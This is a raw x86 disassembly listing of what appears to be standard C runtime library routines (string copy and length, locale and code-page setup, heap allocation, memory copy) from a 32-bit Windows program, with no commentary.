  4257e6:	je     0x4257fa
  4257e8:	test   edx,0xff000000
  4257ee:	je     0x4257f2
  4257f0:	jmp    0x4257b9
  4257f2:	mov    DWORD PTR [edi],edx
  4257f4:	mov    eax,DWORD PTR [esp+0x8]
  4257f8:	pop    edi
  4257f9:	ret    
  4257fa:	mov    WORD PTR [edi],dx
  4257fd:	mov    eax,DWORD PTR [esp+0x8]
  425801:	mov    BYTE PTR [edi+0x2],0x0
  425805:	pop    edi
  425806:	ret    
  425807:	mov    WORD PTR [edi],dx
  42580a:	mov    eax,DWORD PTR [esp+0x8]
  42580e:	pop    edi
  42580f:	ret    
  425810:	mov    BYTE PTR [edi],dl
  425812:	mov    eax,DWORD PTR [esp+0x8]
  425816:	pop    edi
  425817:	ret    
  425818:	int3   
  425819:	int3   
  42581a:	int3   
  42581b:	int3   
  42581c:	int3   
  42581d:	int3   
  42581e:	int3   
  42581f:	int3   
  425820:	mov    ecx,DWORD PTR [esp+0xc]
  425824:	push   edi
  425825:	test   ecx,ecx
  425827:	je     0x4258bf
  42582d:	push   esi
  42582e:	push   ebx
  42582f:	mov    ebx,ecx
  425831:	mov    esi,DWORD PTR [esp+0x14]
  425835:	test   esi,0x3
  42583b:	mov    edi,DWORD PTR [esp+0x10]
  42583f:	jne    0x42584c
  425841:	shr    ecx,0x2
  425844:	jne    0x4258cf
  42584a:	jmp    0x425873
  42584c:	mov    al,BYTE PTR [esi]
  42584e:	add    esi,0x1
  425851:	mov    BYTE PTR [edi],al
  425853:	add    edi,0x1
  425856:	sub    ecx,0x1
  425859:	je     0x425886
  42585b:	test   al,al
  42585d:	je     0x42588e
  42585f:	test   esi,0x3
  425865:	jne    0x42584c
  425867:	mov    ebx,ecx
  425869:	shr    ecx,0x2
  42586c:	jne    0x4258cf
  42586e:	and    ebx,0x3
  425871:	je     0x425886
  425873:	mov    al,BYTE PTR [esi]
  425875:	add    esi,0x1
  425878:	mov    BYTE PTR [edi],al
  42587a:	add    edi,0x1
  42587d:	test   al,al
  42587f:	je     0x4258b8
  425881:	sub    ebx,0x1
  425884:	jne    0x425873
  425886:	mov    eax,DWORD PTR [esp+0x10]
  42588a:	pop    ebx
  42588b:	pop    esi
  42588c:	pop    edi
  42588d:	ret    
  42588e:	test   edi,0x3
  425894:	je     0x4258ac
  425896:	mov    BYTE PTR [edi],al
  425898:	add    edi,0x1
  42589b:	sub    ecx,0x1
  42589e:	je     0x42593c
  4258a4:	test   edi,0x3
  4258aa:	jne    0x425896
  4258ac:	mov    ebx,ecx
  4258ae:	shr    ecx,0x2
  4258b1:	jne    0x425927
  4258b3:	mov    BYTE PTR [edi],al
  4258b5:	add    edi,0x1
  4258b8:	sub    ebx,0x1
  4258bb:	jne    0x4258b3
  4258bd:	pop    ebx
  4258be:	pop    esi
  4258bf:	mov    eax,DWORD PTR [esp+0x8]
  4258c3:	pop    edi
  4258c4:	ret    
  4258c5:	mov    DWORD PTR [edi],edx
  4258c7:	add    edi,0x4
  4258ca:	sub    ecx,0x1
  4258cd:	je     0x42586e
  4258cf:	mov    edx,0x7efefeff
  4258d4:	mov    eax,DWORD PTR [esi]
  4258d6:	add    edx,eax
  4258d8:	xor    eax,0xffffffff
  4258db:	xor    eax,edx
  4258dd:	mov    edx,DWORD PTR [esi]
  4258df:	add    esi,0x4
  4258e2:	test   eax,0x81010100
  4258e7:	je     0x4258c5
  4258e9:	test   dl,dl
  4258eb:	je     0x425919
  4258ed:	test   dh,dh
  4258ef:	je     0x42590f
  4258f1:	test   edx,0xff0000
  4258f7:	je     0x425905
  4258f9:	test   edx,0xff000000
  4258ff:	jne    0x4258c5
  425901:	mov    DWORD PTR [edi],edx
  425903:	jmp    0x42591d
  425905:	and    edx,0xffff
  42590b:	mov    DWORD PTR [edi],edx
  42590d:	jmp    0x42591d
  42590f:	and    edx,0xff
  425915:	mov    DWORD PTR [edi],edx
  425917:	jmp    0x42591d
  425919:	xor    edx,edx
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	add    edi,0x4
  425920:	xor    eax,eax
  425922:	sub    ecx,0x1
  425925:	je     0x425933
  425927:	xor    eax,eax
  425929:	mov    DWORD PTR [edi],eax
  42592b:	add    edi,0x4
  42592e:	sub    ecx,0x1
  425931:	jne    0x425929
  425933:	and    ebx,0x3
  425936:	jne    0x4258b3
  42593c:	mov    eax,DWORD PTR [esp+0x10]
  425940:	pop    ebx
  425941:	pop    esi
  425942:	pop    edi
  425943:	ret    
  425944:	int3   
  425945:	int3   
  425946:	int3   
  425947:	int3   
  425948:	int3   
  425949:	int3   
  42594a:	int3   
  42594b:	int3   
  42594c:	int3   
  42594d:	int3   
  42594e:	int3   
  42594f:	int3   
  425950:	mov    ecx,DWORD PTR [esp+0x4]
  425954:	test   ecx,0x3
  42595a:	je     0x425980
  42595c:	mov    al,BYTE PTR [ecx]
  42595e:	add    ecx,0x1
  425961:	test   al,al
  425963:	je     0x4259b3
  425965:	test   ecx,0x3
  42596b:	jne    0x42595c
  42596d:	add    eax,0x0
  425972:	lea    esp,[esp+0x0]
  425979:	lea    esp,[esp+0x0]
  425980:	mov    eax,DWORD PTR [ecx]
  425982:	mov    edx,0x7efefeff
  425987:	add    edx,eax
  425989:	xor    eax,0xffffffff
  42598c:	xor    eax,edx
  42598e:	add    ecx,0x4
  425991:	test   eax,0x81010100
  425996:	je     0x425980
  425998:	mov    eax,DWORD PTR [ecx-0x4]
  42599b:	test   al,al
  42599d:	je     0x4259d1
  42599f:	test   ah,ah
  4259a1:	je     0x4259c7
  4259a3:	test   eax,0xff0000
  4259a8:	je     0x4259bd
  4259aa:	test   eax,0xff000000
  4259af:	je     0x4259b3
  4259b1:	jmp    0x425980
  4259b3:	lea    eax,[ecx-0x1]
  4259b6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ba:	sub    eax,ecx
  4259bc:	ret    
  4259bd:	lea    eax,[ecx-0x2]
  4259c0:	mov    ecx,DWORD PTR [esp+0x4]
  4259c4:	sub    eax,ecx
  4259c6:	ret    
  4259c7:	lea    eax,[ecx-0x3]
  4259ca:	mov    ecx,DWORD PTR [esp+0x4]
  4259ce:	sub    eax,ecx
  4259d0:	ret    
  4259d1:	lea    eax,[ecx-0x4]
  4259d4:	mov    ecx,DWORD PTR [esp+0x4]
  4259d8:	sub    eax,ecx
  4259da:	ret    
  4259db:	push   0x8
  4259dd:	push   0x429650
  4259e2:	call   0x425340
  4259e7:	and    DWORD PTR [ebp-0x4],0x0
  4259eb:	push   0x0
  4259ed:	push   0x1
  4259ef:	call   0x427562
  4259f4:	pop    ecx
  4259f5:	pop    ecx
  4259f6:	jmp    0x4259ff
  4259f8:	xor    eax,eax
  4259fa:	inc    eax
  4259fb:	ret    
  4259fc:	mov    esp,DWORD PTR [ebp-0x18]
  4259ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a03:	push   0x3
  425a05:	call   DWORD PTR ds:0x429058
  425a0b:	int3   
  425a0c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a12:	jne    0x425a15
  425a14:	ret    
  425a15:	jmp    0x4259db
  425a1a:	movzx  eax,BYTE PTR [esp+0x4]
  425a1f:	mov    cl,BYTE PTR [esp+0xc]
  425a23:	test   BYTE PTR [eax+0x45df21],cl
  425a29:	jne    0x425a47
  425a2b:	cmp    DWORD PTR [esp+0x8],0x0
  425a30:	je     0x425a40
  425a32:	movzx  eax,WORD PTR [eax*2+0x429a4a]
  425a3a:	and    eax,DWORD PTR [esp+0x8]
  425a3e:	jmp    0x425a42
  425a40:	xor    eax,eax
  425a42:	test   eax,eax
  425a44:	jne    0x425a47
  425a46:	ret    
  425a47:	xor    eax,eax
  425a49:	inc    eax
  425a4a:	ret    
  425a4b:	push   0x4
  425a4d:	push   0x0
  425a4f:	push   DWORD PTR [esp+0xc]
  425a53:	call   0x425a1a
  425a58:	add    esp,0xc
  425a5b:	ret    
  425a5c:	sub    eax,0x3a4
  425a61:	je     0x425a85
  425a63:	sub    eax,0x4
  425a66:	je     0x425a7f
  425a68:	sub    eax,0xd
  425a6b:	je     0x425a79
  425a6d:	dec    eax
  425a6e:	je     0x425a73
  425a70:	xor    eax,eax
  425a72:	ret    
  425a73:	mov    eax,0x404
  425a78:	ret    
  425a79:	mov    eax,0x412
  425a7e:	ret    
  425a7f:	mov    eax,0x804
  425a84:	ret    
  425a85:	mov    eax,0x411
  425a8a:	ret    
  425a8b:	push   edi
  425a8c:	push   0x40
  425a8e:	xor    eax,eax
  425a90:	pop    ecx
  425a91:	mov    edi,0x45df20
  425a96:	rep stos DWORD PTR es:[edi],eax
  425a98:	stos   BYTE PTR es:[edi],al
  425a99:	xor    eax,eax
  425a9b:	mov    ds:0x45e024,eax
  425aa0:	mov    ds:0x45df1c,eax
  425aa5:	mov    ds:0x45df14,eax
  425aaa:	mov    edi,0x45e030
  425aaf:	stos   DWORD PTR es:[edi],eax
  425ab0:	stos   DWORD PTR es:[edi],eax
  425ab1:	stos   DWORD PTR es:[edi],eax
  425ab2:	pop    edi
  425ab3:	ret    
  425ab4:	push   ebp
  425ab5:	mov    ebp,esp
  425ab7:	sub    esp,0x518
  425abd:	mov    eax,ds:0x45d430
  425ac2:	xor    eax,DWORD PTR [ebp+0x4]
  425ac5:	push   esi
  425ac6:	mov    DWORD PTR [ebp-0x4],eax
  425ac9:	lea    eax,[ebp-0x18]
  425acc:	push   eax
  425acd:	push   DWORD PTR ds:0x45e024
  425ad3:	call   DWORD PTR ds:0x4290c4
  425ad9:	cmp    eax,0x1
  425adc:	mov    esi,0x100
  425ae1:	jne    0x425bf4
  425ae7:	xor    eax,eax
  425ae9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425af0:	inc    eax
  425af1:	cmp    eax,esi
  425af3:	jb     0x425ae9
  425af5:	mov    al,BYTE PTR [ebp-0x12]
  425af8:	test   al,al
  425afa:	mov    BYTE PTR [ebp-0x118],0x20
  425b01:	je     0x425b39
  425b03:	push   ebx
  425b04:	lea    edx,[ebp-0x11]
  425b07:	push   edi
  425b08:	movzx  ecx,BYTE PTR [edx]
  425b0b:	movzx  eax,al
  425b0e:	cmp    eax,ecx
  425b10:	ja     0x425b2f
  425b12:	sub    ecx,eax
  425b14:	inc    ecx
  425b15:	mov    ebx,ecx
  425b17:	shr    ecx,0x2
  425b1a:	lea    edi,[ebp+eax*1-0x118]
  425b21:	mov    eax,0x20202020
  425b26:	rep stos DWORD PTR es:[edi],eax
  425b28:	mov    ecx,ebx
  425b2a:	and    ecx,0x3
  425b2d:	rep stos BYTE PTR es:[edi],al
  425b2f:	inc    edx
  425b30:	mov    al,BYTE PTR [edx]
  425b32:	inc    edx
  425b33:	test   al,al
  425b35:	jne    0x425b08
  425b37:	pop    edi
  425b38:	pop    ebx
  425b39:	push   0x0
  425b3b:	push   DWORD PTR ds:0x45df14
  425b41:	lea    eax,[ebp-0x518]
  425b47:	push   DWORD PTR ds:0x45e024
  425b4d:	push   eax
  425b4e:	push   esi
  425b4f:	lea    eax,[ebp-0x118]
  425b55:	push   eax
  425b56:	push   0x1
  425b58:	call   0x427a68
  425b5d:	push   0x0
  425b5f:	push   DWORD PTR ds:0x45e024
  425b65:	lea    eax,[ebp-0x218]
  425b6b:	push   esi
  425b6c:	push   eax
  425b6d:	push   esi
  425b6e:	lea    eax,[ebp-0x118]
  425b74:	push   eax
  425b75:	push   esi
  425b76:	push   DWORD PTR ds:0x45df14
  425b7c:	call   0x4276ac
  425b81:	push   0x0
  425b83:	push   DWORD PTR ds:0x45e024
  425b89:	lea    eax,[ebp-0x318]
  425b8f:	push   esi
  425b90:	push   eax
  425b91:	push   esi
  425b92:	lea    eax,[ebp-0x118]
  425b98:	push   eax
  425b99:	push   0x200
  425b9e:	push   DWORD PTR ds:0x45df14
  425ba4:	call   0x4276ac
  425ba9:	add    esp,0x5c
  425bac:	xor    eax,eax
  425bae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bb6:	test   cl,0x1
  425bb9:	je     0x425bd1
  425bbb:	or     BYTE PTR [eax+0x45df21],0x10
  425bc2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bc9:	mov    BYTE PTR [eax+0x45e040],cl
  425bcf:	jmp    0x425bed
  425bd1:	test   cl,0x2
  425bd4:	je     0x425be6
  425bd6:	or     BYTE PTR [eax+0x45df21],0x20
  425bdd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425be4:	jmp    0x425bc9
  425be6:	and    BYTE PTR [eax+0x45e040],0x0
  425bed:	inc    eax
  425bee:	cmp    eax,esi
  425bf0:	jb     0x425bae
  425bf2:	jmp    0x425c38
  425bf4:	xor    eax,eax
  425bf6:	cmp    eax,0x41
  425bf9:	jb     0x425c14
  425bfb:	cmp    eax,0x5a
  425bfe:	ja     0x425c14
  425c00:	or     BYTE PTR [eax+0x45df21],0x10
  425c07:	mov    cl,al
  425c09:	add    cl,0x20
  425c0c:	mov    BYTE PTR [eax+0x45e040],cl
  425c12:	jmp    0x425c33
  425c14:	cmp    eax,0x61
  425c17:	jb     0x425c2c
  425c19:	cmp    eax,0x7a
  425c1c:	ja     0x425c2c
  425c1e:	or     BYTE PTR [eax+0x45df21],0x20
  425c25:	mov    cl,al
  425c27:	sub    cl,0x20
  425c2a:	jmp    0x425c0c
  425c2c:	and    BYTE PTR [eax+0x45e040],0x0
  425c33:	inc    eax
  425c34:	cmp    eax,esi
  425c36:	jb     0x425bf6
  425c38:	mov    ecx,DWORD PTR [ebp-0x4]
  425c3b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c3e:	pop    esi
  425c3f:	call   0x425a0c
  425c44:	leave  
  425c45:	ret    
  425c46:	push   ebp
  425c47:	mov    ebp,esp
  425c49:	sub    esp,0x1c
  425c4c:	mov    eax,ds:0x45d430
  425c51:	xor    eax,DWORD PTR [ebp+0x4]
  425c54:	push   ebx
  425c55:	push   esi
  425c56:	mov    esi,DWORD PTR [ebp+0x8]
  425c59:	xor    ebx,ebx
  425c5b:	cmp    esi,ebx
  425c5d:	mov    DWORD PTR [ebp-0x4],eax
  425c60:	push   edi
  425c61:	je     0x425dbb
  425c67:	xor    edx,edx
  425c69:	xor    eax,eax
  425c6b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c71:	je     0x425cd8
  425c73:	add    eax,0x30
  425c76:	inc    edx
  425c77:	cmp    eax,0xf0
  425c7c:	jb     0x425c6b
  425c7e:	lea    eax,[ebp-0x1c]
  425c81:	push   eax
  425c82:	push   esi
  425c83:	call   DWORD PTR ds:0x4290c4
  425c89:	cmp    eax,0x1
  425c8c:	jne    0x425db3
  425c92:	push   0x40
  425c94:	xor    eax,eax
  425c96:	cmp    DWORD PTR [ebp-0x1c],0x1
  425c9a:	pop    ecx
  425c9b:	mov    edi,0x45df20
  425ca0:	rep stos DWORD PTR es:[edi],eax
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    DWORD PTR ds:0x45e024,esi
  425ca9:	mov    DWORD PTR ds:0x45df14,ebx
  425caf:	jbe    0x425da1
  425cb5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cb9:	je     0x425d79
  425cbf:	lea    ecx,[ebp-0x15]
  425cc2:	mov    dl,BYTE PTR [ecx]
  425cc4:	test   dl,dl
  425cc6:	je     0x425d79
  425ccc:	movzx  eax,BYTE PTR [ecx-0x1]
  425cd0:	movzx  edx,dl
  425cd3:	jmp    0x425d69
  425cd8:	push   0x40
  425cda:	xor    eax,eax
  425cdc:	pop    ecx
  425cdd:	mov    edi,0x45df20
  425ce2:	rep stos DWORD PTR es:[edi],eax
  425ce4:	lea    ecx,[edx+edx*2]
  425ce7:	shl    ecx,0x4
  425cea:	mov    DWORD PTR [ebp-0x8],ebx
  425ced:	stos   BYTE PTR es:[edi],al
  425cee:	lea    ebx,[ecx+0x45d450]
  425cf4:	mov    al,BYTE PTR [ebx]
  425cf6:	mov    esi,ebx
  425cf8:	jmp    0x425d23
  425cfa:	mov    dl,BYTE PTR [esi+0x1]
  425cfd:	test   dl,dl
  425cff:	je     0x425d27
  425d01:	movzx  eax,al
  425d04:	movzx  edi,dl
  425d07:	cmp    eax,edi
  425d09:	ja     0x425d1f
  425d0b:	mov    edx,DWORD PTR [ebp-0x8]
  425d0e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d14:	or     BYTE PTR [eax+0x45df21],dl
  425d1a:	inc    eax
  425d1b:	cmp    eax,edi
  425d1d:	jbe    0x425d14
  425d1f:	inc    esi
  425d20:	inc    esi
  425d21:	mov    al,BYTE PTR [esi]
  425d23:	test   al,al
  425d25:	jne    0x425cfa
  425d27:	inc    DWORD PTR [ebp-0x8]
  425d2a:	add    ebx,0x8
  425d2d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d31:	jb     0x425cf4
  425d33:	mov    eax,DWORD PTR [ebp+0x8]
  425d36:	mov    ds:0x45e024,eax
  425d3b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d45:	call   0x425a5c
  425d4a:	lea    ecx,[ecx+0x45d444]
  425d50:	mov    esi,ecx
  425d52:	mov    edi,0x45e030
  425d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d59:	mov    ds:0x45df14,eax
  425d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d5f:	jmp    0x425dc0
  425d61:	or     BYTE PTR [eax+0x45df21],0x4
  425d68:	inc    eax
  425d69:	cmp    eax,edx
  425d6b:	jbe    0x425d61
  425d6d:	inc    ecx
  425d6e:	inc    ecx
  425d6f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d73:	jne    0x425cc2
  425d79:	xor    ecx,ecx
  425d7b:	inc    ecx
  425d7c:	mov    eax,ecx
  425d7e:	or     BYTE PTR [eax+0x45df21],0x8
  425d85:	inc    eax
  425d86:	cmp    eax,0xff
  425d8b:	jb     0x425d7e
  425d8d:	mov    eax,esi
  425d8f:	call   0x425a5c
  425d94:	mov    ds:0x45df14,eax
  425d99:	mov    DWORD PTR ds:0x45df1c,ecx
  425d9f:	jmp    0x425da7
  425da1:	mov    DWORD PTR ds:0x45df1c,ebx
  425da7:	xor    eax,eax
  425da9:	mov    edi,0x45e030
  425dae:	stos   DWORD PTR es:[edi],eax
  425daf:	stos   DWORD PTR es:[edi],eax
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	jmp    0x425dc0
  425db3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425db9:	je     0x425dc9
  425dbb:	call   0x425a8b
  425dc0:	call   0x425ab4
  425dc5:	xor    eax,eax
  425dc7:	jmp    0x425dcc
  425dc9:	or     eax,0xffffffff
  425dcc:	mov    ecx,DWORD PTR [ebp-0x4]
  425dcf:	xor    ecx,DWORD PTR [ebp+0x4]
  425dd2:	pop    edi
  425dd3:	pop    esi
  425dd4:	pop    ebx
  425dd5:	call   0x425a0c
  425dda:	leave  
  425ddb:	ret    
  425ddc:	push   0x14
  425dde:	push   0x429660
  425de3:	call   0x425340
  425de8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dec:	push   0xd
  425dee:	call   0x4254ff
  425df3:	pop    ecx
  425df4:	xor    edi,edi
  425df6:	mov    DWORD PTR [ebp-0x4],edi
  425df9:	mov    DWORD PTR ds:0x45dd84,edi
  425dff:	mov    eax,DWORD PTR [ebp+0x8]
  425e02:	cmp    eax,0xfffffffe
  425e05:	jne    0x425e19
  425e07:	mov    DWORD PTR ds:0x45dd84,0x1
  425e11:	call   DWORD PTR ds:0x4290c0
  425e17:	jmp    0x425e44
  425e19:	cmp    eax,0xfffffffd
  425e1c:	jne    0x425e30
  425e1e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e28:	call   DWORD PTR ds:0x4290bc
  425e2e:	jmp    0x425e44
  425e30:	cmp    eax,0xfffffffc
  425e33:	jne    0x425e44
  425e35:	mov    DWORD PTR ds:0x45dd84,0x1
  425e3f:	mov    eax,ds:0x45ddb4
  425e44:	mov    DWORD PTR [ebp+0x8],eax
  425e47:	cmp    eax,DWORD PTR ds:0x45e024
  425e4d:	je     0x425f0e
  425e53:	mov    esi,DWORD PTR ds:0x45df18
  425e59:	mov    DWORD PTR [ebp-0x20],esi
  425e5c:	cmp    esi,edi
  425e5e:	je     0x425e64
  425e60:	cmp    DWORD PTR [esi],edi
  425e62:	je     0x425e74
  425e64:	push   0x220
  425e69:	call   0x426062
  425e6e:	pop    ecx
  425e6f:	mov    esi,eax
  425e71:	mov    DWORD PTR [ebp-0x20],esi
  425e74:	cmp    esi,edi
  425e76:	je     0x425ef7
  425e78:	push   DWORD PTR [ebp+0x8]
  425e7b:	call   0x425c46
  425e80:	pop    ecx
  425e81:	mov    DWORD PTR [ebp-0x1c],eax
  425e84:	cmp    eax,edi
  425e86:	jne    0x425ef7
  425e88:	mov    DWORD PTR [esi],edi
  425e8a:	mov    eax,ds:0x45e024
  425e8f:	mov    DWORD PTR [esi+0x4],eax
  425e92:	mov    eax,ds:0x45df1c
  425e97:	mov    DWORD PTR [esi+0x8],eax
  425e9a:	mov    eax,ds:0x45df14
  425e9f:	mov    DWORD PTR [esi+0xc],eax
  425ea2:	xor    eax,eax
  425ea4:	mov    DWORD PTR [ebp-0x24],eax
  425ea7:	cmp    eax,0x5
  425eaa:	jge    0x425ebc
  425eac:	mov    cx,WORD PTR [eax*2+0x45e030]
  425eb4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425eb9:	inc    eax
  425eba:	jmp    0x425ea4
  425ebc:	xor    eax,eax
  425ebe:	mov    DWORD PTR [ebp-0x24],eax
  425ec1:	cmp    eax,0x101
  425ec6:	jge    0x425ed5
  425ec8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ece:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ed2:	inc    eax
  425ed3:	jmp    0x425ebe
  425ed5:	xor    eax,eax
  425ed7:	mov    DWORD PTR [ebp-0x24],eax
  425eda:	cmp    eax,0x100
  425edf:	jge    0x425ef1
  425ee1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ee7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425eee:	inc    eax
  425eef:	jmp    0x425ed7
  425ef1:	mov    DWORD PTR ds:0x45df18,esi
  425ef7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425efb:	jne    0x425f11
  425efd:	cmp    esi,DWORD PTR ds:0x45df18
  425f03:	je     0x425f11
  425f05:	push   esi
  425f06:	call   0x425f4a
  425f0b:	pop    ecx
  425f0c:	jmp    0x425f11
  425f0e:	mov    DWORD PTR [ebp-0x1c],edi
  425f11:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f15:	call   0x425f23
  425f1a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f1d:	call   0x42537b
  425f22:	ret    
  425f23:	push   0xd
  425f25:	call   0x42546b
  425f2a:	pop    ecx
  425f2b:	ret    
  425f2c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f33:	jne    0x425f47
  425f35:	push   0xfffffffd
  425f37:	call   0x425ddc
  425f3c:	pop    ecx
  425f3d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f47:	xor    eax,eax
  425f49:	ret    
  425f4a:	push   0xc
  425f4c:	push   0x429670
  425f51:	call   0x425340
  425f56:	mov    esi,DWORD PTR [ebp+0x8]
  425f59:	test   esi,esi
  425f5b:	je     0x425fb5
  425f5d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f64:	jne    0x425fa6
  425f66:	push   0x4
  425f68:	call   0x4254ff
  425f6d:	pop    ecx
  425f6e:	and    DWORD PTR [ebp-0x4],0x0
  425f72:	push   esi
  425f73:	call   0x426722
  425f78:	pop    ecx
  425f79:	mov    DWORD PTR [ebp-0x1c],eax
  425f7c:	test   eax,eax
  425f7e:	je     0x425f89
  425f80:	push   esi
  425f81:	push   eax
  425f82:	call   0x42674d
  425f87:	pop    ecx
  425f88:	pop    ecx
  425f89:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f8d:	call   0x425f9d
  425f92:	cmp    DWORD PTR [ebp-0x1c],0x0
  425f96:	jne    0x425fb5
  425f98:	push   DWORD PTR [ebp+0x8]
  425f9b:	jmp    0x425fa7
  425f9d:	push   0x4
  425f9f:	call   0x42546b
  425fa4:	pop    ecx
  425fa5:	ret    
  425fa6:	push   esi
  425fa7:	push   0x0
  425fa9:	push   DWORD PTR ds:0x45e140
  425faf:	call   DWORD PTR ds:0x42902c
  425fb5:	call   0x42537b
  425fba:	ret    
  425fbb:	push   0xc
  425fbd:	push   0x429680
  425fc2:	call   0x425340
  425fc7:	mov    esi,DWORD PTR [ebp+0x8]
  425fca:	cmp    DWORD PTR ds:0x45e144,0x3
  425fd1:	jne    0x426001
  425fd3:	cmp    esi,DWORD PTR ds:0x45df04
  425fd9:	ja     0x426001
  425fdb:	push   0x4
  425fdd:	call   0x4254ff
  425fe2:	pop    ecx
  425fe3:	and    DWORD PTR [ebp-0x4],0x0
  425fe7:	push   esi
  425fe8:	call   0x426f01
  425fed:	pop    ecx
  425fee:	mov    DWORD PTR [ebp-0x1c],eax
  425ff1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ff5:	call   0x42602d
  425ffa:	mov    eax,DWORD PTR [ebp-0x1c]
  425ffd:	test   eax,eax
  425fff:	jne    0x426024
  426001:	test   esi,esi
  426003:	jne    0x426006
  426005:	inc    esi
  426006:	cmp    DWORD PTR ds:0x45e144,0x1
  42600d:	je     0x426015
  42600f:	add    esi,0xf
  426012:	and    esi,0xfffffff0
  426015:	push   esi
  426016:	push   0x0
  426018:	push   DWORD PTR ds:0x45e140
  42601e:	call   DWORD PTR ds:0x429030
  426024:	call   0x42537b
  426029:	ret    
  42602a:	mov    esi,DWORD PTR [ebp+0x8]
  42602d:	push   0x4
  42602f:	call   0x42546b
  426034:	pop    ecx
  426035:	ret    
  426036:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42603b:	ja     0x42605f
  42603d:	push   DWORD PTR [esp+0x4]
  426041:	call   0x425fbb
  426046:	test   eax,eax
  426048:	pop    ecx
  426049:	jne    0x426061
  42604b:	cmp    DWORD PTR [esp+0x8],eax
  42604f:	je     0x426061
  426051:	push   DWORD PTR [esp+0x4]
  426055:	call   0x427c22
  42605a:	test   eax,eax
  42605c:	pop    ecx
  42605d:	jne    0x42603d
  42605f:	xor    eax,eax
  426061:	ret    
  426062:	push   DWORD PTR ds:0x45ddc8
  426068:	push   DWORD PTR [esp+0x8]
  42606c:	call   0x426036
  426071:	pop    ecx
  426072:	pop    ecx
  426073:	ret    
  426074:	int3   
  426075:	int3   
  426076:	int3   
  426077:	int3   
  426078:	int3   
  426079:	int3   
  42607a:	int3   
  42607b:	int3   
  42607c:	int3   
  42607d:	int3   
  42607e:	int3   
  42607f:	int3   
  426080:	push   ebp
  426081:	mov    ebp,esp
  426083:	push   edi
  426084:	push   esi
  426085:	mov    esi,DWORD PTR [ebp+0xc]
  426088:	mov    ecx,DWORD PTR [ebp+0x10]
  42608b:	mov    edi,DWORD PTR [ebp+0x8]
  42608e:	mov    eax,ecx
  426090:	mov    edx,ecx
  426092:	add    eax,esi
  426094:	cmp    edi,esi
  426096:	jbe    0x4260a0
  426098:	cmp    edi,eax
  42609a:	jb     0x42621c
  4260a0:	test   edi,0x3
  4260a6:	jne    0x4260bc
  4260a8:	shr    ecx,0x2
  4260ab:	and    edx,0x3
  4260ae:	cmp    ecx,0x8
  4260b1:	jb     0x4260dc
  4260b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260b5:	jmp    DWORD PTR [edx*4+0x4261cc]
  4260bc:	mov    eax,edi
  4260be:	mov    edx,0x3
  4260c3:	sub    ecx,0x4
  4260c6:	jb     0x4260d4
  4260c8:	and    eax,0x3
  4260cb:	add    ecx,eax
  4260cd:	jmp    DWORD PTR [eax*4+0x4260e0]
  4260d4:	jmp    DWORD PTR [ecx*4+0x4261dc]
  4260db:	nop
  4260dc:	jmp    DWORD PTR [ecx*4+0x426160]
  4260e3:	nop
  4260e4:	lock pusha 
  4260e6:	inc    edx
  4260e7:	add    BYTE PTR [ecx+eiz*2],bl
  4260ea:	inc    edx
  4260eb:	add    BYTE PTR [eax+0x61],al
  4260ee:	inc    edx
  4260ef:	add    BYTE PTR [ebx],ah
  4260f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4260f7:	inc    esi
  4260f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4260fe:	add    al,cl
  426100:	jmp    0x289e907
  426105:	add    esi,0x3
  426108:	add    edi,0x3
  42610b:	cmp    ecx,0x8
  42610e:	jb     0x4260dc
  426110:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	jmp    DWORD PTR [edx*4+0x4261cc]
  426119:	lea    ecx,[ecx+0x0]
  42611c:	and    edx,ecx
  42611e:	mov    al,BYTE PTR [esi]
  426120:	mov    BYTE PTR [edi],al
  426122:	mov    al,BYTE PTR [esi+0x1]
  426125:	shr    ecx,0x2
  426128:	mov    BYTE PTR [edi+0x1],al
  42612b:	add    esi,0x2
  42612e:	add    edi,0x2
  426131:	cmp    ecx,0x8
  426134:	jb     0x4260dc
  426136:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426138:	jmp    DWORD PTR [edx*4+0x4261cc]
  42613f:	nop
  426140:	and    edx,ecx
  426142:	mov    al,BYTE PTR [esi]
  426144:	mov    BYTE PTR [edi],al
  426146:	add    esi,0x1
  426149:	shr    ecx,0x2
  42614c:	add    edi,0x1
  42614f:	cmp    ecx,0x8
  426152:	jb     0x4260dc
  426154:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
